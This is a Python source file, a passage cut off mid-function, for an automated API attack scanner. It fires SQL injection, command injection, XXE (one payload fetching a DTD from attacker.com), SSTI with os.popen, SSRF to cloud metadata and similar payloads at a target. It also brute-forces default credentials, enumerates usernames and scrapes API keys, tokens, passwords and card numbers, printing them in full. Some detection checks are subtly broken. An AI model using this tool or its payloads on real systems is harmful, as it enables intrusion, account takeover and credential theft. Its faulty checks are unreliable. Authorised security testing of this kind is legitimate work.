import requests
import json
import sys
import time
import re
import random
import string
import base64
import xml.etree.ElementTree as ET
from urllib.parse import urljoin, urlparse, quote, unquote
class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

class AdvancedAPITester:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Advanced-API-Tester/1.0',
            'Accept': 'application/json, */*'
        })
        self.vulnerabilities = []
        self.tested_endpoints = set()
        self.discovered_endpoints = set()
        self.jwt_tokens = []
        self.api_keys = []
        self.sensitive_data = []
    
        self.payloads = {
            "sql_injection": [
                "' OR '1'='1", "' UNION SELECT NULL--", "admin'--", "' OR 1=1--", 
                "1; DROP TABLE users", "1' WAITFOR DELAY '0:0:5'--", 
                "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "1'; EXEC xp_cmdshell('dir')--", "1' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
                "1' OR (SELECT COUNT(*) FROM sysobjects) > 0--", "1' OR (SELECT COUNT(*) FROM information_schema.tables) > 0--"
            ],
            "xss": [
                "<script>alert('XSS')</script>", "\"><script>alert('XSS')</script>",
                "javascript:alert('XSS')", "onload=alert('XSS')", 
                "<img src=x onerror=alert('XSS')>", "{{7*7}}", "${7*7}",
                "<!--#exec cmd=\"id\"-->", "<svg onload=alert('XSS')>",
                "javascript:confirm('XSS')", "javascript:prompt('XSS')"
            ],
            "path_traversal": [
                "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
                "..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts",
                "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts",
                "/etc/passwd", "c:\\windows\\system32\\drivers\\etc\\hosts",
                "../../../../etc/passwd%00", "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00"
            ],
            "cmdi": [
                "; ls -la", "| whoami", "&& id", "|| ping -c 1 localhost",
                "`id`", "$(id)", "| dir", "&& type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "; cat /etc/passwd", "| net user", "; pwd", "| ipconfig",
                "&& netstat -an", "; ps aux", "| systeminfo"
            ],
            "idor": [
                "../user/1", "./admin/../user/2", "user/0", "api/user/1", 
                "admin/../../user/3", "user/12345", "account/1", "profile/1",
                "customer/1", "order/1", "invoice/1", "document/1"
            ],
            "ssrf": [
                "http://localhost:22", "http://127.0.0.1:22", "http://169.254.169.254/latest/meta-data/",
                "http://localhost:80/admin", "http://127.0.0.1:6379", "http://0.0.0.0:8080",
                "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO", "dict://127.0.0.1:11211/stat",
                "http://localhost:9200", "http://127.0.0.1:27017", "http://localhost:5984",
                "http://169.254.169.254/metadata/instance", "http://metadata.google.internal"
            ],
            "xxe": [
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>",
                "<!--?xml version=\"1.0\" ?--><!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\">]><userInfo><firstName>&ent;</firstName></userInfo>",
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
            ],
            "ssti": [
                "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "${{7*7}}", 
                "{{''.__class__.__mro__[1].__subclasses__()}}", 
                "{{config}}", "{{settings.SECRET_KEY}}", "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
            ],
            "header_injection": [
                "localhost:80\nX-Forwarded-Host: evil.com",
                "example.com\r\nX-Forwarded-For: 127.0.0.1",
                "test.com\r\nHost: evil.com",
                "api.example.com\nX-Real-IP: 127.0.0.1",
                "example.com\r\nReferer: evil.com"
            ],
            "jwt_tampering": [
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
                "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
            ],
            "nosql_injection": [
                '{"$where": "this.owner == \'admin\'"}',
                '{"$gt": ""}',
                '{"$ne": ""}',
                '{"$regex": ".*"}',
                '{"$where": "sleep(5000)"}',
                '{"username": {"$ne": null}, "password": {"$ne": null}}'
            ],
            "graphql_injection": [
                '{__schema{types{name}}}',
                'fragment __Type on __Type { name }',
                'query { __typename }',
                'mutation { createUser(input: {username: "admin", password: "password"}) { user { id } } }',
                'query { users { email password } }'
            ],
            "prototype_pollution": [
                '{"__proto__": {"isAdmin": true}}',
                '{"constructor": {"prototype": {"isAdmin": true}}}',
                '{"__proto__": {"toString": function() { return "hacked"; }}}'
            ]
        }
    
    def print_status(self, message, status="info"):
        """Print colored status messages"""
        if status == "info":
            print(f"{Colors.BLUE}[+] {message}{Colors.END}")
        elif status == "success":
            print(f"{Colors.GREEN}[+] {message}{Colors.END}")
        elif status == "warning":
            print(f"{Colors.YELLOW}[!] {message}{Colors.END}")
        elif status == "error":
            print(f"{Colors.RED}[!] {message}{Colors.END}")
        elif status == "vuln":
            print(f"{Colors.RED}{Colors.BOLD}[VULN] {message}{Colors.END}")
        elif status == "advanced":
            print(f"{Colors.PURPLE}[*] {message}{Colors.END}")
        elif status == "data":
            print(f"{Colors.CYAN}[$] {message}{Colors.END}")
    
    def test_endpoint(self, url, method="GET", params=None, headers=None, data=None):
        """Test a single endpoint for vulnerabilities"""
        if url in self.tested_endpoints:
            return
        self.tested_endpoints.add(url)
        
        self.print_status(f"Testing {method} {url}", "info")
        
        try:

            if method.upper() == "GET":
                response = self.session.get(url, timeout=10, params=params, headers=headers)
            elif method.upper() == "POST":
                response = self.session.post(url, timeout=10, json=data, params=params, headers=headers)
            elif method.upper() == "PUT":
                response = self.session.put(url, timeout=10, json=data, params=params, headers=headers)
            elif method.upper() == "DELETE":
                response = self.session.delete(url, timeout=10, params=params, headers=headers)
            elif method.upper() == "PATCH":
                response = self.session.patch(url, timeout=10, json=data, params=params, headers=headers)
            elif method.upper() == "HEAD":
                response = self.session.head(url, timeout=10, params=params, headers=headers)
            elif method.upper() == "OPTIONS":
                response = self.session.options(url, timeout=10, params=params, headers=headers)
            else:
                return
            
            self.check_vulnerabilities(response, url, method, params, data, headers)
            
            self.extract_jwt_tokens(response)
            
            self.extract_sensitive_data(response, url)
            
            return response
            
        except requests.exceptions.RequestException as e:
            self.print_status(f"Error testing {url}: {str(e)}", "error")
            return None
    
    def extract_jwt_tokens(self, response):
   
        jwt_pattern = r'eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*'
        matches = re.findall(jwt_pattern, response.text)
        for token in matches:
            if token not in self.jwt_tokens:
                self.jwt_tokens.append(token)
                self.print_status(f"Found JWT token: {token[:50]}...", "success")
        
        for header, value in response.headers.items():
            if 'auth' in header.lower() or 'token' in header.lower() or 'jwt' in header.lower():
                matches = re.findall(jwt_pattern, value)
                for token in matches:
                    if token not in self.jwt_tokens:
                        self.jwt_tokens.append(token)
                        self.print_status(f"Found JWT token in {header}: {token[:50]}...", "success")
    
    def extract_sensitive_data(self, response, url):
        """Extract API keys and sensitive data from response"""
        # API key patterns
        api_key_patterns = {
            'AWS_ACCESS_KEY': r'AKIA[0-9A-Z]{16}',
            'AWS_SECRET_KEY': r'[0-9a-zA-Z/+]{40}',
            'Google_API_KEY': r'AIza[0-9A-Za-z\\-_]{35}',
            'Google_OAUTH': r'ya29\\.[0-9A-Za-z\\-_]+',
            'Facebook_ACCESS_TOKEN': r'EAACEdEose0cBA[0-9A-Za-z]+',
            'Twitter_ACCESS_TOKEN': r'[0-9a-zA-Z]{35,44}',
            'GitHub_ACCESS_TOKEN': r'ghp_[0-9a-zA-Z]{36}',
            'Slack_ACCESS_TOKEN': r'xox[baprs]-[0-9a-zA-Z]{10,48}',
            'Stripe_API_KEY': r'sk_live_[0-9a-zA-Z]{24}',
            'Twilio_API_KEY': r'SK[0-9a-fA-F]{32}',
            'Password': r'password[=:]\s*[\'"]?([^\'"\s]+)',
            'Email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'Credit Card': r'\b(?:\d[ -]*?){13,16}\b',
            'JWT': r'eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*'
        }
        
        for data_type, pattern in api_key_patterns.items():
            matches = re.findall(pattern, response.text)
            for match in matches:
                if match not in self.sensitive_data:
                    self.sensitive_data.append({
                        'type': data_type,
                        'value': match,
                        'url': url
                    })
                    self.print_status(f"Found {data_type}: {match}", "data")
        
        # Check headers for sensitive information
        for header, value in response.headers.items():
            if any(keyword in header.lower() for keyword in ['key', 'token', 'secret', 'password', 'credential']):
                if value and len(value) > 10:  # Basic length check to avoid false positives
                    self.sensitive_data.append({
                        'type': f'Header_{header}',
                        'value': value,
                        'url': url
                    })
                    self.print_status(f"Found sensitive header {header}: {value[:50]}...", "data")
    
    def test_jwt_vulnerabilities(self):
        """Test extracted JWT tokens for vulnerabilities"""
        self.print_status("Testing JWT tokens for vulnerabilities", "advanced")
        
        for token in self.jwt_tokens:
            # Test for None algorithm vulnerability
            try:
                parts = token.split('.')
                if len(parts) != 3:
                    continue
                    
                header = json.loads(base64.urlsafe_b64decode(parts[0] + '==').decode())
                if header.get('alg') == 'none':
                    self.vulnerabilities.append({
                        "type": "JWT Algorithm None",
                        "url": "JWT Token",
                        "method": "N/A",
                        "params": {"token": token},
                        "evidence": "JWT uses 'none' algorithm which can be exploited",
                        "severity": "High"
                    })
                    self.print_status(f"JWT with 'none' algorithm found: {token[:30]}...", "vuln")
            except:
                pass
            
            # Test for weak secret key
            weak_secrets = ["secret", "password", "123456", "qwerty", "admin", "test", "key", "changeme"]
            for secret in weak_secrets:
                try:
                    import jwt
                    jwt.decode(token, secret, algorithms=['HS256'])
                    self.vulnerabilities.append({
                        "type": "JWT Weak Secret",
                        "url": "JWT Token",
                        "method": "N/A",
                        "params": {"token": token, "secret": secret},
                        "evidence": f"JWT can be decoded with weak secret: {secret}",
                        "severity": "High"
                    })
                    self.print_status(f"JWT vulnerable to weak secret '{secret}': {token[:30]}...", "vuln")
                    break
                except:
                    continue
    
    def check_vulnerabilities(self, response, url, method, params, data, headers):
        """Check response for signs of vulnerabilities"""
        text = response.text.lower()
        resp_headers = str(response.headers).lower()
        
        # SQL Injection detection
        sql_errors = [
            "sql syntax", "mysql_fetch", "ora-01756", "postgresql", 
            "microsoft ole db provider", "syntax error", "mysql_num_rows",
            "mysqli_fetch", "pg_exec", "sqlite3", "unclosed quotation mark",
            "odbc", "jdbc", "database error"
        ]
        
        if any(error in text for error in sql_errors):
            self.vulnerabilities.append({
                "type": "SQL Injection",
                "url": url,
                "method": method,
                "params": params or data,
                "evidence": "SQL error in response",
                "severity": "High"
            })
            self.print_status(f"SQL Injection vulnerability found at {url}", "vuln")
        
        # XSS detection
        if response.status_code < 500 and any(payload in response.text for payload in self.payloads["xss"]):
            self.vulnerabilities.append({
                "type": "XSS",
                "url": url,
                "method": method,
                "params": params or data,
                "evidence": "XSS payload reflected in response",
                "severity": "Medium"
            })
            self.print_status(f"XSS vulnerability found at {url}", "vuln")
        
        # Path Traversal detection
        if any(indicator in text for indicator in ["root:", "daemon:", "/bin/bash", "etc/passwd", "boot.ini", "windows/system32"]):
            self.vulnerabilities.append({
                "type": "Path Traversal",
                "url": url,
                "method": method,
                "params": params or data,
                "evidence": "Sensitive file content in response",
                "severity": "High"
            })
            self.print_status(f"Path Traversal vulnerability found at {url}", "vuln")
        
        # Command Injection detection
        if any(indicator in text for indicator in ["bin/bash", "www/html", "permission denied", "cannot access", "command not found", "volume in drive"]):
            self.vulnerabilities.append({
                "type": "Command Injection",
                "url": url,
                "method": method,
                "params": params or data,
                "evidence": "Command output in response",
                "severity": "High"
            })
            self.print_status(f"Command Injection vulnerability found at {url}", "vuln")
        
        # IDOR detection
        if response.status_code == 200 and any(indicator in url for indicator in ["user", "account", "profile", "id=", "uid="]):
            if any(indicator in text for indicator in ["email", "password", "admin", "user", "private", "secret"]):
                self.vulnerabilities.append({
                    "type": "IDOR",
                    "url": url,
                    "method": method,
                    "params": params or data,
                    "evidence": "Sensitive data exposure through IDOR",
                    "severity": "Medium"
                })
                self.print_status(f"IDOR vulnerability found at {url}", "vuln")
        
        # SSTI detection
        if any(indicator in text for indicator in ["49", "777", "1337"]) and any(payload in (params or {} or data or {}) for payload in self.payloads["ssti"]):
            self.vulnerabilities.append({
                "type": "Server-Side Template Injection",
                "url": url,
                "method": method,
                "params": params or data,
                "evidence": "Template expression executed on server",
                "severity": "High"
            })
            self.print_status(f"SSTI vulnerability found at {url}", "vuln")
        
        # XXE detection
        if any(indicator in text for indicator in ["root:", "daemon:", "/etc/passwd", "boot.ini"]) and any("xml" in param.lower() for param in (params or {} or data or {})):
            self.vulnerabilities.append({
                "type": "XXE Injection",
                "url": url,
                "method": method,
                "params": params or data,
                "evidence": "XML external entity processing detected",
                "severity": "High"
            })
            self.print_status(f"XXE vulnerability found at {url}", "vuln")
        
        # NoSQL Injection detection
        if any(indicator in text for indicator in ["mongodb", "mongoose", "nosql", "mongodb error"]) and any(payload in str(params or data) for payload in self.payloads["nosql_injection"]):
            self.vulnerabilities.append({
                "type": "NoSQL Injection",
                "url": url,
                "method": method,
                "params": params or data,
                "evidence": "NoSQL injection payload executed",
                "severity": "High"
            })
            self.print_status(f"NoSQL Injection vulnerability found at {url}", "vuln")
        
        # Open Redirect detection
        if response.status_code in [301, 302, 307, 308] and "location" in response.headers:
            location = response.headers["location"]
            if any(redirect in location for redirect in ["evil.com", "attacker.com", "example.com"]):
                self.vulnerabilities.append({
                    "type": "Open Redirect",
                    "url": url,
                    "method": method,
                    "params": params or data,
                    "evidence": f"Redirect to external domain: {location}",
                    "severity": "Medium"
                })
                self.print_status(f"Open Redirect vulnerability found at {url}", "vuln")
        
        # Security header detection
        security_headers = ["x-frame-options", "x-content-type-options", 
                           "x-xss-protection", "strict-transport-security",
                           "content-security-policy"]
        
        missing_headers = []
        for header in security_headers:
            if header not in resp_headers:
                missing_headers.append(header)
        
        if missing_headers:
            self.vulnerabilities.append({
                "type": "Missing Security Headers",
                "url": url,
                "method": method,
                "params": params or data,
                "evidence": f"Missing security headers: {', '.join(missing_headers)}",
                "severity": "Low"
            })
    
    def find_endpoints(self, base_url):
        """Try to discover API endpoints with advanced techniques"""
        self.print_status(f"Discovering endpoints for {base_url}", "info")
        
        common_endpoints = [
            "/api/users", "/api/products", "/api/auth", "/api/login",
            "/api/admin", "/api/config", "/api/health", "/api/v1/users",
            "/user", "/admin", "/login", "/register", "/api", "/swagger",
            "/redoc", "/openapi", "/graphql", "/users", "/posts", "/comments",
            "/v1/users", "/v2/users", "/v1/auth", "/v2/auth", "/v1/admin", "/v2/admin",
            "/api/v1/login", "/api/v2/login", "/api/v1/register", "/api/v2/register",
            "/oauth/token", "/oauth/authorize", "/.well-known/openid-configuration",
            "/actuator", "/actuator/health", "/metrics", "/debug", "/console",
            "/phpmyadmin", "/adminer", "/wp-admin", "/wp-json", "/_api", "/_admin",
            "/_console", "/_debug", "/_phpinfo", "/info.php", "/test.php",
            "/backup", "/backups", "/db", "/database", "/config", "/configuration",
            "/env", "/environment", "/logs", "/api-docs", "/swagger-ui", "/swagger.json",
            "/graphiql", "/voyager", "/altair", "/playground"
        ]
        
        discovered = []
        
        for endpoint in common_endpoints:
            test_url = urljoin(base_url, endpoint)
            try:
                response = self.session.get(test_url, timeout=5)
                if response.status_code < 400:  # Not 4xx or 5xx
                    discovered.append(test_url)
                    self.print_status(f"Found endpoint: {test_url}", "success")
                    
                    # Check for directory listing
                    if "index of" in response.text.lower():
                        self.vulnerabilities.append({
                            "type": "Directory Listing",
                            "url": test_url,
                            "method": "GET",
                            "params": None,
                            "evidence": "Directory listing enabled",
                            "severity": "Low"
                        })
                        self.print_status(f"Directory listing enabled at {test_url}", "vuln")
            except:
                pass
        
        # Try common file extensions
        extensions = [".json", ".xml", ".yaml", ".yml", ".php", ".asp", ".aspx", ".jsp", ".txt", ".bak", ".old", ".backup"]
        for ext in extensions:
            test_url = urljoin(base_url, f"/api{ext}")
            try:
                response = self.session.get(test_url, timeout=5)
                if response.status_code < 400:
                    discovered.append(test_url)
                    self.print_status(f"Found endpoint: {test_url}", "success")
            except:
                pass
        
        # Try common API patterns
        api_patterns = [
            "/api/{id}", "/users/{id}", "/products/{id}", "/v1/{resource}",
            "/v2/{resource}", "/{version}/users", "/{version}/products"
        ]
        
        # Test with common IDs
        test_ids = ["1", "123", "test", "admin", "user", "guest"]
        for pattern in api_patterns:
            for test_id in test_ids:
                test_url = urljoin(base_url, pattern.replace("{id}", test_id).replace("{resource}", "test").replace("{version}", "v1"))
                try:
                    response = self.session.get(test_url, timeout=5)
                    if response.status_code < 400:
                        discovered.append(test_url)
                        self.print_status(f"Found endpoint: {test_url}", "success")
                except:
                    pass
        
        return discovered
    
    def test_auth(self, base_url):
        """Test authentication endpoints with advanced techniques"""
        self.print_status("Testing authentication endpoints", "info")
        
        auth_endpoints = [
            "/api/login", "/login", "/auth", "/api/auth", "/oauth/token", "/signin",
            "/api/signin", "/api/v1/login", "/api/v2/login", "/v1/auth", "/v2/auth"
        ]
        
        for endpoint in auth_endpoints:
            test_url = urljoin(base_url, endpoint)
            
            # Test with common credentials
            common_logins = [
                {"username": "admin", "password": "admin"},
                {"username": "admin", "password": "password"},
                {"username": "test", "password": "test"},
                {"username": "user", "password": "user"},
                {"username": "root", "password": "root"},
                {"email": "admin@example.com", "password": "admin"},
                {"email": "test@example.com", "password": "test"},
                {"username": "administrator", "password": "administrator"},
                {"username": "guest", "password": "guest"},
                {"username": "admin", "password": "123456"},
                {"username": "admin", "password": "qwerty"},
                {"username": "admin", "password": "letmein"}
            ]
            
            for credentials in common_logins:
                try:
                    response = self.session.post(test_url, json=credentials, timeout=10)
                    if response.status_code == 200 and ("token" in response.text or "success" in response.text.lower() or "welcome" in response.text.lower()):
                        self.vulnerabilities.append({
                            "type": "Weak Credentials",
                            "url": test_url,
                            "method": "POST",
                            "params": credentials,
                            "evidence": f"Accepted weak credentials: {credentials}",
                            "severity": "High"
                        })
                        self.print_status(f"Weak credentials accepted at {test_url}: {credentials}", "vuln")
                except:
                    pass
            
            # Test for username enumeration
            test_usernames = ["admin", "administrator", "root", "test", "user", "guest"]
            for username in test_usernames:
                try:
                    response = self.session.post(test_url, json={"username": username, "password": "invalid_password_123!"}, timeout=10)
                    if "invalid password" in response.text.lower() or "incorrect password" in response.text.lower():
                        self.vulnerabilities.append({
                            "type": "Username Enumeration",
                            "url": test_url,
                            "method": "POST",
                            "params": {"username": username},
                            "evidence": f"Username enumeration possible: {username}",
                            "severity": "Medium"
                        })
                        self.print_status(f"Username enumeration possible for {username} at {test_url}", "vuln")
                except:
                    pass
            
            # Test for account lockout
            for i in range(10):
                try:
                    response = self.session.post(test_url, json={"username": "admin", "password": f"wrong_password_{i}"}, timeout=5)
                    if "locked" in response.text.lower() or "try again later" in response.text.lower():
                        self.vulnerabilities.append({
                            "type": "Account Lockout",
                            "url": test_url,
                            "method": "POST",
                            "params": {"attempts": i+1},
                            "evidence": f"Account lockout after {i+1} attempts",
                            "severity": "Low"
                        })
                        self.print_status(f"Account lockout detected at {test_url} after {i+1} attempts", "vuln")
                        break
                except:
                    pass
    
    def test_cors(self, base_url):
        """Test for CORS misconfigurations with advanced techniques"""
        self.print_status("Testing CORS configurations", "info")
        
        test_endpoints = self.find_endpoints(base_url)
        test_endpoints.append(base_url)
        
        malicious_origins = [
            "https://evil.com",
            "http://attacker.com",
            "null",
            "https://" + "a" * 100 + ".com",
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "https://example.com",
            "https://subdomain.evil.com"
        ]
        
        for endpoint in test_endpoints:
            for origin in malicious_origins:
                try:
                    response = self.session.get(endpoint, timeout=5, headers={'Origin': origin})
                    acao = response.headers.get('Access-Control-Allow-Origin')
                    acac = response.headers.get('Access-Control-Allow-Credentials', '').lower()
                    
                    if acao == origin or acao == '*':
                        vulnerability = {
                            "type": "CORS Misconfiguration",
                            "url": endpoint,
                            "method": "GET",
                            "params": {"Origin": origin},
                            "evidence": f"CORS allows origin: {acao}",
                            "severity": "Medium"
                        }
                        
                        if acao == '*' and acac == 'true':
                            vulnerability["severity"] = "High"
                            vulnerability["evidence"] = f"CORS allows any origin with credentials: {acao}"
                        
                        self.vulnerabilities.append(vulnerability)
                        self.print_status(f"CORS misconfiguration at {endpoint} with origin {origin}", "vuln")
                except:
                    pass
    
    def test_ssrf(self, base_url):
        """Test for Server-Side Request Forgery vulnerabilities"""
        self.print_status("Testing for SSRF vulnerabilities", "advanced")
        
        # Look for parameters that might be vulnerable to SSRF
        ssrf_params = ["url", "proxy", "image", "path", "file", "load", "uri", "request", "host"]
        
        # Test endpoints that might be vulnerable
        test_endpoints = [
            "/api/export", "/api/import", "/api/fetch", "/api/proxy", 
            "/api/thumbnail", "/api/image", "/api/convert", "/api/load"
        ]
        
        for endpoint in test_endpoints:
            test_url = urljoin(base_url, endpoint)
            
            for param in ssrf_params:
                for payload in self.payloads["ssrf"]:
                    try:
                        if endpoint in ["/api/export", "/api/import", "/api/fetch"]:
                            response = self.session.post(test_url, json={param: payload}, timeout=10)
                        else:
                            response = self.session.get(test_url, params={param: payload}, timeout=10)
                        
                        # Check for signs of SSRF
                        if any(indicator in response.text for indicator in ["ec2", "metadata", "localhost", "127.0.0.1", "internal"]):
                            self.vulnerabilities.append({
                                "type": "SSRF",
                                "url": test_url,
                                "method": "POST" if endpoint in ["/api/export", "/api/import", "/api/fetch"] else "GET",
                                "params": {param: payload},
                                "evidence": f"SSRF potential with payload: {payload}",
                                "severity": "High"
                            })
                            self.print_status(f"SSRF vulnerability found at {test_url} with parameter {param}", "vuln")
                    except:
                        pass
    
    def test_xxe(self, base_url):
        """Test for XXE vulnerabilities"""
        self.print_status("Testing for XXE vulnerabilities", "advanced")
        
        # Look for endpoints that accept XML
        xml_endpoints = [
            "/api/xml", "/api/soap", "/api/export", "/api/import", 
            "/api/upload", "/api/convert", "/xml", "/soap"
        ]
        
        for endpoint in xml_endpoints:
            test_url = urljoin(base_url, endpoint)
            
            for payload in self.payloads["xxe"]:
                try:
                    headers = {'Content-Type': 'application/xml'}
                    response = self.session.post(test_url, data=payload, headers=headers, timeout=10)
                    
                    # Check for signs of XXE
                    if any(indicator in response.text for indicator in ["root:", "daemon:", "/etc/passwd", "boot.ini"]):
                        self.vulnerabilities.append({
                            "type": "XXE",
                            "url": test_url,
                            "method": "POST",
                            "params": {"payload": payload[:100] + "..."},
                            "evidence": "XXE payload executed",
                            "severity": "High"
                        })
                        self.print_status(f"XXE vulnerability found at {test_url}", "vuln")
                except:
                    pass
    
    def test_ssti(self, base_url):
        """Test for Server-Side Template Injection vulnerabilities"""
        self.print_status("Testing for SSTI vulnerabilities", "advanced")
        
        # Test endpoints that might be vulnerable to SSTI
        for endpoint in self.discovered_endpoints:
            if any(param in endpoint for param in ["name", "template", "view", "page"]):
                for payload in self.payloads["ssti"]:
                    try:
                        # Test in GET parameters
                        if '?' in endpoint:
                            base_url, query_string = endpoint.split('?', 1)
                            params = {}
                            
                            for param in query_string.split('&'):
                                if '=' in param:
                                    key, value = param.split('=', 1)
                                    params[key] = payload
                            
                            response = self.session.get(base_url, params=params, timeout=10)
                            
                            # Check for signs of SSTI
                            if any(indicator in response.text for indicator in ["49", "777", "1337"]):
                                self.vulnerabilities.append({
                                    "type": "SSTI",
                                    "url": base_url,
                                    "method": "GET",
                                    "params": params,
                                    "evidence": f"SSTI payload executed: {payload}",
                                    "severity": "High"
                                })
                                self.print_status(f"SSTI vulnerability found at {base_url}", "vuln")
                    except:
                        pass
    
    def test_nosql_injection(self, base_url):
        """Test for NoSQL injection vulnerabilities"""
        self.print_status("Testing for NoSQL injection vulnerabilities", "advanced")
        
        # Look for endpoints that might use NoSQL databases
        nosql_endpoints = [
            "/api/users", "/api/login", "/api/auth", "/api/products",
            "/users", "/login", "/auth", "/products"
        ]
        
        for endpoint in nosql_endpoints:
            test_url = urljoin(base_url, endpoint)
            
            for payload in self.payloads["nosql_injection"]:
                try:
                    # Test with JSON payload
                    response = self.session.post(test_url, json=json.loads(payload), timeout=10)
                    
                    # Check for signs of NoSQL injection
                    if response.status_code == 200 and ("admin" in response.text or "password" in response.text):
                        self.vulnerabilities.append({
                            "type": "NoSQL Injection",
                            "url": test_url,
                            "method": "POST",
                            "params": {"payload": payload},
                            "evidence": "NoSQL injection payload executed",
                            "severity": "High"
                        })
                        self.print_status(f"NoSQL Injection vulnerability found at {test_url}", "vuln")
                except:
                    pass
    
    def test_graphql_injection(self, base_url):
        """Test for GraphQL injection vulnerabilities"""
        self.print_status("Testing for GraphQL injection vulnerabilities", "advanced")
        
        # Test GraphQL endpoints
        graphql_endpoints = [
            "/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql",
            "/gql", "/api/gql", "/query", "/api/query"
        ]
        
        for endpoint in graphql_endpoints:
            test_url = urljoin(base_url, endpoint)
            
            for payload in self.payloads["graphql_injection"]:
                try:
                    response = self.session.post(test_url, json={"query": payload}, timeout=10)
                    
                    # Check for signs of GraphQL injection
                    if response.status_code == 200 and ("__schema" in response.text or "users" in response.text):
                        self.vulnerabilities.append({
                            "type": "GraphQL Injection",
                            "url": test_url,
                            "method": "POST",
                            "params": {"query": payload},
                            "evidence": "GraphQL injection payload executed",
                            "severity": "High"
                        })
                        self.print_status(f"GraphQL Injection vulnerability found at {test_url}", "vuln")
                except:
                    pass
    
    def test_prototype_pollution(self, base_url):
        """Test for Prototype Pollution vulnerabilities"""
        self.print_status("Testing for Prototype Pollution vulnerabilities", "advanced")
        
        # Test endpoints that accept JSON
        json_endpoints = [
            "/api/users", "/api/products", "/api/config", "/api/settings",
            "/users", "/products", "/config", "/settings"
        ]
        
        for endpoint in json_endpoints:
            test_url = urljoin(base_url, endpoint)
            
            for payload in self.payloads["prototype_pollution"]:
                try:
                    response = self.session.post(test_url, json=json.loads(payload), timeout=10)
                    
                    # Check for signs of prototype pollution
                    if response.status_code == 200 and ("isAdmin" in response.text or "toString" in response.text):
                        self.vulnerabilities.append({
                            "type": "Prototype Pollution",
                            "url": test_url,
                            "method": "POST",
                            "params": {"payload": payload},
                            "evidence": "Prototype pollution payload executed",
                            "severity": "High"
                        })
                        self.print_status(f"Prototype Pollution vulnerability found at {test_url}", "vuln")
                except:
                    pass
    
    def fuzz_parameters(self, url):
        """Fuzz parameters with advanced payloads"""
        self.print_status(f"Fuzzing parameters for {url}", "info")
        
        # Only test GET parameters for simplicity
        if '?' not in url:
            return
            
        base_url, query_string = url.split('?', 1)
        params = {}
        
        for param in query_string.split('&'):
            if '=' in param:
                key, value = param.split('=', 1)
                params[key] = value
        
        # Test each parameter with payloads
        for param_name in params.keys():
            for payload_type, payload_list in self.payloads.items():
                for payload in payload_list:
                    try:
                        test_params = params.copy()
                        test_params[param_name] = payload
                        
                        response = self.session.get(base_url, params=test_params, timeout=10)
                        self.check_vulnerabilities(response, base_url, "GET", test_params)
                        
                    except:
                        pass
    
    def test_rate_limiting(self, base_url):
        """Test for rate limiting vulnerabilities"""
        self.print_status("Testing for rate limiting bypass", "advanced")
        
        # Test endpoints that might be rate limited
        test_endpoints = [
            "/api/login", "/login", "/api/auth", "/auth", 
            "/api/register", "/register", "/api/password/reset"
        ]
        
        for endpoint in test_endpoints:
            test_url = urljoin(base_url, endpoint)
            
            # Make multiple rapid requests
            for i in range(20):
                try:
                    response = self.session.post(test_url, json={"test": "payload"}, timeout=5)
                    
                    # If we don't get rate limited, there might be a vulnerability
                    if i > 10 and response.status_code != 429 and response.status_code != 403:
                        self.vulnerabilities.append({
                            "type": "Rate Limiting Bypass",
                            "url": test_url,
                            "method": "POST",
                            "params": {"request_count": i+1},
                            "evidence": f"No rate limiting after {i+1} requests",
                            "severity": "Medium"
                        })
                        self.print_status(f"Rate limiting bypass possible at {test_url}", "vuln")
                        break
                except:
                    pass
    
    def test_http_methods(self, base_url):
        """Test for HTTP method vulnerabilities"""
        self.print_status("Testing HTTP methods", "advanced")
        
        for endpoint in self.discovered_endpoints:
            for method in ["PUT", "DELETE", "PATCH", "TRACE", "CONNECT"]:
                try:
                    response = self.session.request(method, endpoint, timeout=10)
                    
                    # Check if dangerous methods are enabled
                    if response.status_code < 400:
                        self.vulnerabilities.append({
                            "type": "Dangerous HTTP Method Enabled",
                            "url": endpoint,
                            "method": method,
                            "params": None,
                            "evidence": f"HTTP {method} method allowed",
                            "severity": "Medium"
                        })
                        self.print_status(f"HTTP {method} method allowed at {endpoint}", "vuln")
                except:
                    pass
    
    def test_broken_object_level_auth(self, base_url):
        """Test for Broken Object Level Authorization vulnerabilities"""
        self.print_status("Testing for BOLA vulnerabilities", "advanced")
        
        # Test endpoints with ID parameters
